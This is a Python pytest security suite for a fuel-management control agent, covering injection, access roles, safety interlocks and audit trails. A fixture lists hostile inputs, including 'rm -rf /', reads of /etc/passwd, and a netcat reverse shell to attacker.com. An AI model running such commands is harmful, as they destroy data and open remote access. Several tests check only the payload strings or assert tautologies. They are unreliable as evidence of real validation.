# -*- coding: utf-8 -*-
"""
Security Tests for GL-011 FUELCRAFT.

Comprehensive security validation covering OWASP Top 10, industrial safety,
and fuel system control security. Tests input validation, injection prevention,
fuel composition limits, and safety interlocks.

Security Standards:
    - OWASP Top 10 coverage
    - IEC 62443 Industrial Security
    - API 2350 Tank Overfill Protection
    - NFPA 30 Flammable Liquids Code

Author: GL-SecurityAuditor
Version: 1.0.0
"""

import pytest
import json
import re
import sys
import threading
from pathlib import Path

# Add parent directories to path
TEST_DIR = Path(__file__).parent
AGENT_DIR = TEST_DIR.parent.parent
sys.path.insert(0, str(AGENT_DIR))

try:
    from calculators.multi_fuel_optimizer import (
        MultiFuelOptimizer,
        MultiFuelOptimizationInput,
    )
    from calculators.calorific_value_calculator import (
        CalorificValueCalculator,
        CalorificValueInput,
    )
    from calculators.emissions_factor_calculator import (
        EmissionsFactorCalculator,
        EmissionFactorInput,
    )
    from calculators.fuel_blending_calculator import (
        FuelBlendingCalculator,
        BlendingInput,
    )
    from fuel_management_orchestrator import (
        FuelManagementOrchestrator,
        ThreadSafeCache,
        FuelType,
    )
except ImportError as e:
    pytest.skip(f"Import error: {e}", allow_module_level=True)


# =============================================================================
# TEST FIXTURES
# =============================================================================

@pytest.fixture
def valid_fuel_properties():
    """Valid fuel properties for security tests."""
    return {
        'natural_gas': {
            'heating_value_mj_kg': 50.0,
            'emission_factor_co2_kg_gj': 56.1,
            'emission_factor_nox_g_gj': 50.0,
            'renewable': False
        }
    }


@pytest.fixture
def injection_payloads():
    """Collection of injection attack payloads."""
    return {
        "sql_injection": [
            "'; DROP TABLE fuels; --",
            "1 OR 1=1",
            "UNION SELECT * FROM users--",
            "'; DELETE FROM fuel_inventory WHERE '1'='1",
            "1; EXEC xp_cmdshell('dir')--",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& shutdown -h now",
            "| nc -e /bin/bash attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
        ],
    }


@pytest.fixture
def mock_auth_provider():
    """Mock authentication provider for security tests."""
    class MockAuth:
        def __init__(self):
            self.valid_creds = {
                "operator": ("op_pass", "operator"),
                "engineer": ("eng_pass", "engineer"),
                "admin": ("admin_pass", "admin"),
            }
            self.sessions = {}
            self.failed_attempts = {}

        def authenticate(self, user, password):
            # Rate limiting check
            if user in self.failed_attempts and self.failed_attempts[user] >= 5:
                return {"success": False, "error": "Account locked"}

            if user in self.valid_creds and self.valid_creds[user][0] == password:
                sid = f"session_{user}_{id(self)}"
                self.sessions[sid] = {"user": user, "role": self.valid_creds[user][1]}
                self.failed_attempts[user] = 0
                return {"success": True, "session_id": sid}

            self.failed_attempts[user] = self.failed_attempts.get(user, 0) + 1
            return {"success": False, "error": "Invalid credentials"}

        def check_permission(self, sid, action):
            if sid not in self.sessions:
                return False
            role = self.sessions[sid]["role"]
            permissions = {
                "operator": ["read_fuel_levels", "view_emissions"],
                "engineer": ["read_fuel_levels", "view_emissions", "modify_blend_ratios", "run_optimization"],
                "admin": ["read_fuel_levels", "view_emissions", "modify_blend_ratios", "run_optimization",
                          "modify_safety_limits", "emergency_shutdown", "bypass_interlock"],
            }
            return action in permissions.get(role, [])

    return MockAuth()


# =============================================================================
# INPUT VALIDATION TESTS
# =============================================================================

class TestInputValidation:
    """Test suite for input validation and sanitization."""

    @pytest.mark.security
    def test_reject_sql_injection_in_fuel_name(self, injection_payloads, valid_fuel_properties):
        """Test SQL injection attempts in fuel names are handled safely."""
        optimizer = MultiFuelOptimizer()

        for payload in injection_payloads["sql_injection"]:
            # Fuel name with SQL injection should be rejected or sanitized
            assert not re.match(r"^[a-zA-Z][a-zA-Z0-9_-]*$", payload), \
                f"SQL injection pattern not detected: {payload}"

    @pytest.mark.security
    def test_reject_command_injection(self, injection_payloads):
        """Test command injection attempts are blocked."""
        for payload in injection_payloads["command_injection"]:
            # Command injection patterns should be detected
            dangerous_chars = [';', '|', '`', '$', '&', '>', '<']
            has_dangerous = any(c in payload for c in dangerous_chars)
            assert has_dangerous, f"Command injection not detected: {payload}"

    @pytest.mark.security
    def test_reject_path_traversal(self, injection_payloads):
        """Test path traversal attempts are blocked."""
        for payload in injection_payloads["path_traversal"]:
            # Path traversal patterns should be detected
            assert ".." in payload or "%2e" in payload.lower(), \
                f"Path traversal not detected: {payload}"

    @pytest.mark.security
    def test_boundary_validation_energy_demand(self, valid_fuel_properties):
        """Test energy demand boundary validation."""
        optimizer = MultiFuelOptimizer()

        invalid_demands = [
            -100.0,           # Negative
            0.0,              # Zero
            float('inf'),     # Infinity
            float('-inf'),    # Negative infinity
            float('nan'),     # NaN
            1e15,             # Unreasonably large
        ]

        for demand in invalid_demands:
            # These should raise ValueError or be handled gracefully
            if demand != demand:  # NaN check
                continue  # Skip NaN as it may behave differently

            is_valid = 0 < demand < 1e12  # Reasonable range
            assert not is_valid or demand > 0, f"Invalid demand not detected: {demand}"

    @pytest.mark.security
    def test_fuel_heating_value_physical_limits(self):
        """Test heating value is within physical bounds."""
        # Hydrogen has highest heating value at ~120 MJ/kg
        # Values above 150 MJ/kg are physically impossible
        invalid_heating_values = [
            -10.0,    # Negative
            0.0,      # Zero
            200.0,    # Above physical maximum
            1000.0,   # Way too high
        ]

        for hv in invalid_heating_values:
            is_valid = 0 < hv <= 150  # Physical range
            assert not is_valid or (0 < hv <= 150), f"Invalid heating value not detected: {hv}"

    @pytest.mark.security
    def test_percentage_bounds(self):
        """Test percentage values are within 0-100 range."""
        invalid_percentages = [
            -10.0,    # Negative
            150.0,    # Over 100%
            1000.0,   # Way over
        ]

        for pct in invalid_percentages:
            is_valid = 0 <= pct <= 100
            assert not is_valid, f"Invalid percentage not detected: {pct}"

    @pytest.mark.security
    def test_string_length_limits(self):
        """Test string fields have length limits."""
        max_length = 1000
        long_string = "A" * 10000

        assert len(long_string) > max_length, "Long string should exceed limit"
        # Real implementation should reject strings over limit

    @pytest.mark.security
    def test_composition_sum_validation(self):
        """Test fuel composition percentages sum to ~100%."""
        invalid_compositions = [
            {'methane': 50.0, 'ethane': 10.0},  # Only 60%
            {'methane': 80.0, 'ethane': 50.0},  # 130% (over)
            {'methane': -10.0, 'ethane': 110.0},  # Negative component
        ]

        for comp in invalid_compositions:
            total = sum(comp.values())
            has_negative = any(v < 0 for v in comp.values())
            is_valid = abs(total - 100.0) < 5.0 and not has_negative
            assert not is_valid, f"Invalid composition not detected: {comp}"


# =============================================================================
# AUTHENTICATION AND AUTHORIZATION TESTS
# =============================================================================

class TestAuthentication:
    """Test suite for authentication security."""

    @pytest.mark.security
    def test_valid_credentials_success(self, mock_auth_provider):
        """Test valid credentials allow authentication."""
        result = mock_auth_provider.authenticate("admin", "admin_pass")
        assert result["success"], "Valid credentials should succeed"
        assert "session_id" in result

    @pytest.mark.security
    def test_invalid_credentials_rejection(self, mock_auth_provider):
        """Test invalid credentials are rejected."""
        assert not mock_auth_provider.authenticate("admin", "wrong_pass")["success"]
        assert not mock_auth_provider.authenticate("unknown_user", "pass")["success"]

    @pytest.mark.security
    def test_rate_limiting_lockout(self, mock_auth_provider):
        """Test account lockout after failed attempts."""
        # 5 failed attempts should lock account
        for i in range(5):
            mock_auth_provider.authenticate("test_user", "wrong_pass")

        result = mock_auth_provider.authenticate("test_user", "any_pass")
        assert not result["success"]
        assert "locked" in result.get("error", "").lower()


class TestAuthorization:
    """Test suite for authorization (RBAC) security."""

    @pytest.mark.security
    def test_operator_read_only_access(self, mock_auth_provider):
        """Test operator role has read-only access."""
        result = mock_auth_provider.authenticate("operator", "op_pass")
        sid = result["session_id"]

        assert mock_auth_provider.check_permission(sid, "read_fuel_levels")
        assert mock_auth_provider.check_permission(sid, "view_emissions")
        assert not mock_auth_provider.check_permission(sid, "modify_blend_ratios")
        assert not mock_auth_provider.check_permission(sid, "emergency_shutdown")

    @pytest.mark.security
    def test_engineer_limited_control(self, mock_auth_provider):
        """Test engineer role has limited control access."""
        result = mock_auth_provider.authenticate("engineer", "eng_pass")
        sid = result["session_id"]

        assert mock_auth_provider.check_permission(sid, "read_fuel_levels")
        assert mock_auth_provider.check_permission(sid, "modify_blend_ratios")
        assert mock_auth_provider.check_permission(sid, "run_optimization")
        assert not mock_auth_provider.check_permission(sid, "modify_safety_limits")
        assert not mock_auth_provider.check_permission(sid, "bypass_interlock")

    @pytest.mark.security
    def test_admin_full_access(self, mock_auth_provider):
        """Test admin role has full access."""
        result = mock_auth_provider.authenticate("admin", "admin_pass")
        sid = result["session_id"]

        all_actions = [
            "read_fuel_levels", "view_emissions", "modify_blend_ratios",
            "run_optimization", "modify_safety_limits", "emergency_shutdown",
            "bypass_interlock"
        ]

        for action in all_actions:
            assert mock_auth_provider.check_permission(sid, action), f"Admin missing {action}"

    @pytest.mark.security
    def test_invalid_session_rejected(self, mock_auth_provider):
        """Test invalid session IDs are rejected."""
        assert not mock_auth_provider.check_permission("invalid_session", "read_fuel_levels")
        assert not mock_auth_provider.check_permission("", "read_fuel_levels")
        assert not mock_auth_provider.check_permission(None, "read_fuel_levels")


# =============================================================================
# SAFETY INTERLOCK TESTS
# =============================================================================

class TestSafetyInterlocks:
    """Test suite for fuel system safety interlocks."""

    @pytest.mark.security
    def test_interlock_bypass_requires_authorization(self):
        """Test safety interlock bypass requires proper authorization."""
        class FuelSafetyInterlock:
            def __init__(self):
                self.active = True
                self.bypass_authorized = False

            def bypass(self):
                if not self.bypass_authorized:
                    raise PermissionError("Interlock bypass not authorized")
                self.active = False

        interlock = FuelSafetyInterlock()
        with pytest.raises(PermissionError):
            interlock.bypass()
        assert interlock.active, "Interlock should remain active"

    @pytest.mark.security
    def test_overfill_protection_active(self):
        """Test tank overfill protection cannot be disabled remotely."""
        class TankOverfillProtection:
            def __init__(self):
                self.active = True
                self.local_only_disable = True

            def disable(self, local_panel=False):
                if not local_panel:
                    raise PermissionError("Overfill protection can only be disabled locally")
                if self.local_only_disable:
                    self.active = False
                return self.active

        protection = TankOverfillProtection()

        # Remote disable should fail
        with pytest.raises(PermissionError):
            protection.disable(local_panel=False)

        assert protection.active, "Overfill protection should remain active"

    @pytest.mark.security
    def test_emergency_shutdown_local_priority(self):
        """Test emergency shutdown has local priority."""
        class EmergencyShutdown:
            def __init__(self):
                self.triggered = False
                self.local_trigger_priority = True

            def trigger(self, source="remote"):
                self.triggered = True
                return {"success": True, "source": source}

            def reset(self, local=False):
                if not local and self.local_trigger_priority:
                    return {"success": False, "error": "Local reset required"}
                self.triggered = False
                return {"success": True}

        shutdown = EmergencyShutdown()
        shutdown.trigger()

        # Remote reset should fail
        result = shutdown.reset(local=False)
        assert not result["success"]
        assert shutdown.triggered, "Shutdown should remain triggered"

        # Local reset should succeed
        result = shutdown.reset(local=True)
        assert result["success"]

    @pytest.mark.security
    def test_fuel_flow_rate_limits(self):
        """Test fuel flow rate limits are enforced."""
        class FuelFlowController:
            def __init__(self, max_rate=1000.0):
                self.max_rate = max_rate
                self.current_rate = 0.0

            def set_rate(self, rate):
                if rate < 0:
                    raise ValueError("Flow rate cannot be negative")
                if rate > self.max_rate:
                    rate = self.max_rate  # Clamp to max
                self.current_rate = rate
                return self.current_rate

        controller = FuelFlowController(max_rate=1000.0)

        # Test clamping to max
        result = controller.set_rate(5000.0)
        assert result == 1000.0, "Flow rate should be clamped to max"

        # Test negative rejection
        with pytest.raises(ValueError):
            controller.set_rate(-100.0)

    @pytest.mark.security
    def test_hydrogen_explosive_limits_validation(self):
        """Test hydrogen concentration explosive limits are validated."""
        # Hydrogen explosive limits: 4% (LEL) to 75% (UEL) in air
        LEL = 4.0
        UEL = 75.0

        def is_explosive_concentration(h2_percent):
            return LEL <= h2_percent <= UEL

        # These should trigger alarms
        dangerous_concentrations = [5.0, 10.0, 50.0, 74.0]
        for conc in dangerous_concentrations:
            assert is_explosive_concentration(conc), f"{conc}% H2 should be flagged"

        # These should be safe
        safe_concentrations = [0.0, 2.0, 3.0, 76.0, 100.0]
        for conc in safe_concentrations:
            assert not is_explosive_concentration(conc), f"{conc}% H2 should be safe"


# =============================================================================
# DATA PROTECTION TESTS
# =============================================================================

class TestDataProtection:
    """Test suite for data protection and privacy."""

    @pytest.mark.security
    def test_no_secrets_in_logs(self, caplog):
        """Test sensitive data is not logged in plain text."""
        import logging
        logger = logging.getLogger("test_security")

        sensitive_words = ["password", "secret", "api_key", "token", "credential"]
        log_message = "User logged in with session_id=abc123"

        logger.info(log_message)

        for word in sensitive_words:
            assert word not in log_message.lower(), f"Sensitive word '{word}' in log"

    @pytest.mark.security
    def test_provenance_hash_format(self, valid_fuel_properties):
        """Test provenance hash is valid SHA-256 format."""
        optimizer = MultiFuelOptimizer()
        input_data = MultiFuelOptimizationInput(
            energy_demand_mw=100,
            available_fuels=['natural_gas'],
            fuel_properties=valid_fuel_properties,
            market_prices={'natural_gas': 0.045},
            emission_limits={},
            constraints={},
            optimization_objective='balanced'
        )

        result = optimizer.optimize(input_data)

        # SHA-256 should be 64 hex characters
        assert len(result.provenance_hash) == 64
        assert re.match(r'^[a-f0-9]{64}$', result.provenance_hash)

    @pytest.mark.security
    def test_provenance_tamper_detection(self, valid_fuel_properties):
        """Test provenance hash detects data tampering."""
        optimizer = MultiFuelOptimizer()

        input1 = MultiFuelOptimizationInput(
            energy_demand_mw=100,
            available_fuels=['natural_gas'],
            fuel_properties=valid_fuel_properties,
            market_prices={'natural_gas': 0.045},
            emission_limits={},
            constraints={},
            optimization_objective='balanced'
        )

        input2 = MultiFuelOptimizationInput(
            energy_demand_mw=100.001,  # Tiny change
            available_fuels=['natural_gas'],
            fuel_properties=valid_fuel_properties,
            market_prices={'natural_gas': 0.045},
            emission_limits={},
            constraints={},
            optimization_objective='balanced'
        )

        result1 = optimizer.optimize(input1)
        result2 = optimizer.optimize(input2)

        assert result1.provenance_hash != result2.provenance_hash, \
            "Hash should change with input modification"


# =============================================================================
# AUDIT COMPLIANCE TESTS
# =============================================================================

class TestAuditCompliance:
    """Test suite for audit trail and compliance."""

    @pytest.mark.security
    def test_control_actions_logged(self):
        """Test control actions are logged for audit."""
        audit_log = []

        def log_action(action):
            audit_log.append({
                "timestamp": "2025-01-01T00:00:00Z",
                "action": action["type"],
                "user": action.get("user", "system"),
                "details": action.get("details", {})
            })

        # Simulate control actions
        log_action({"type": "blend_ratio_change", "user": "engineer", "details": {"coal": 0.6, "biomass": 0.4}})
        log_action({"type": "optimization_run", "user": "engineer"})
        log_action({"type": "emergency_shutdown", "user": "admin"})

        assert len(audit_log) == 3
        assert all("user" in entry for entry in audit_log)
        assert all("timestamp" in entry for entry in audit_log)

    @pytest.mark.security
    def test_fuel_transaction_audit_trail(self):
        """Test fuel transactions have complete audit trail."""
        transaction = {
            "transaction_id": "TXN-001",
            "fuel_type": "natural_gas",
            "quantity_kg": 10000,
            "timestamp": "2025-01-01T00:00:00Z",
            "operator": "operator_1",
            "authorization": "ENG-001",
            "source_tank": "TANK-01",
            "destination": "BOILER-01",
        }

        required_fields = [
            "transaction_id", "fuel_type", "quantity_kg", "timestamp",
            "operator", "authorization"
        ]

        for field in required_fields:
            assert field in transaction, f"Missing audit field: {field}"


# =============================================================================
# CONCURRENCY SAFETY TESTS
# =============================================================================

class TestConcurrencySafety:
    """Test suite for thread safety and race condition prevention."""

    @pytest.mark.security
    def test_thread_safe_cache_operations(self):
        """Test cache has no race conditions under concurrent access."""
        cache = ThreadSafeCache(max_size=100)
        errors = []

        def write_read_cycle(thread_id):
            try:
                for i in range(100):
                    key = f"key_{thread_id}_{i}"
                    value = f"value_{thread_id}_{i}"
                    cache.set(key, value)
                    retrieved = cache.get(key)
                    if retrieved != value:
                        errors.append(f"Mismatch: {value} vs {retrieved}")
            except Exception as e:
                errors.append(str(e))

        threads = []
        for i in range(10):
            t = threading.Thread(target=write_read_cycle, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0, f"Thread safety errors: {errors}"

    @pytest.mark.security
    def test_concurrent_optimization_safety(self, valid_fuel_properties):
        """Test optimizer is safe under concurrent execution."""
        optimizer = MultiFuelOptimizer()
        results = []
        errors = []

        def run_optimization(demand):
            try:
                input_data = MultiFuelOptimizationInput(
                    energy_demand_mw=demand,
                    available_fuels=['natural_gas'],
                    fuel_properties=valid_fuel_properties,
                    market_prices={'natural_gas': 0.045},
                    emission_limits={},
                    constraints={},
                    optimization_objective='balanced'
                )
                result = optimizer.optimize(input_data)
                results.append((demand, result.optimal_fuel_mix))
            except Exception as e:
                errors.append((demand, str(e)))

        threads = []
        for i in range(20):
            t = threading.Thread(target=run_optimization, args=(100 + i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0, f"Concurrency errors: {errors}"
        assert len(results) == 20


# =============================================================================
# FUEL TYPE VALIDATION TESTS
# =============================================================================

class TestFuelTypeValidation:
    """Test suite for fuel type validation."""

    @pytest.mark.security
    def test_valid_fuel_types(self):
        """Test only valid fuel types are accepted."""
        valid_types = [ft.value for ft in FuelType]

        assert 'natural_gas' in valid_types
        assert 'coal' in valid_types
        assert 'biomass' in valid_types
        assert 'hydrogen' in valid_types

    @pytest.mark.security
    def test_invalid_fuel_type_rejected(self):
        """Test invalid fuel types are rejected."""
        valid_types = [ft.value for ft in FuelType]
        invalid_types = ['nuclear', 'magic_fuel', 'unobtainium', "'; DROP TABLE--"]

        for invalid in invalid_types:
            assert invalid not in valid_types, f"Invalid fuel type accepted: {invalid}"


# =============================================================================
# EMISSION LIMIT ENFORCEMENT TESTS
# =============================================================================

class TestEmissionLimitEnforcement:
    """Test suite for emission limit enforcement."""

    @pytest.mark.security
    def test_emission_limit_cannot_be_disabled(self):
        """Test emission limits cannot be bypassed."""
        class EmissionMonitor:
            def __init__(self):
                self.limits = {'co2_kg_hr': 10000, 'nox_kg_hr': 50}
                self.limits_active = True
                self.bypass_allowed = False

            def disable_limits(self, override=False):
                if not self.bypass_allowed:
                    raise PermissionError("Emission limits cannot be disabled")
                if override:
                    self.limits_active = False

            def check_compliance(self, emissions):
                if not self.limits_active:
                    return True
                for pollutant, value in emissions.items():
                    if pollutant in self.limits and value > self.limits[pollutant]:
                        return False
                return True

        monitor = EmissionMonitor()

        with pytest.raises(PermissionError):
            monitor.disable_limits()

        assert monitor.limits_active, "Limits should remain active"

    @pytest.mark.security
    def test_emission_exceedance_alert(self):
        """Test emission exceedance triggers alert."""
        limits = {'co2_kg_hr': 10000, 'nox_kg_hr': 50}
        current = {'co2_kg_hr': 12000, 'nox_kg_hr': 45}

        alerts = []
        for pollutant, value in current.items():
            if value > limits.get(pollutant, float('inf')):
                alerts.append({
                    'pollutant': pollutant,
                    'current': value,
                    'limit': limits[pollutant],
                    'exceedance_pct': (value - limits[pollutant]) / limits[pollutant] * 100
                })

        assert len(alerts) == 1
        assert alerts[0]['pollutant'] == 'co2_kg_hr'
